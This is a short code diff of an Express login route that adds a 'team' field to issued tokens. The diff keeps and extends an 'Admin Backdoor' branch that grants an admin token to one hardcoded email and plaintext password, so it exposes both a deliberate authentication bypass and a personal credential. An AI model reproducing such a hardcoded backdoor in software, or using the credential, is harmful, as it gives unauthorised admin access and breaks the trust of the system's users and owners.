@@ -18,8 +18,9 @@ router.post('/login', async (req, res) => {
 
     // Admin Backdoor
     if (email.toLowerCase() === 'miguelalvizuri7@gmail.com' && password === 'Losmickijr123') {
-      const token = generateToken({ name: 'Administrador General', role: 'Admin', email });
-      return res.json({ token, user: { name: 'Administrador General', role: 'Admin', email } });
+      const adminUser = { name: 'Administrador General', role: 'Admin', email, team: 'BOTH' };
+      const token = generateToken(adminUser);
+      return res.json({ token, user: adminUser });
     }
 
     // Look for employee (case-insensitive in Supabase using ilike)
@@ -43,7 +44,8 @@ router.post('/login', async (req, res) => {
     const user = {
       name: employee.name,
       role: role,
-      email: employee.email
+      email: employee.email,
+      team: employee.team
     };
 
     const token = generateToken(user);
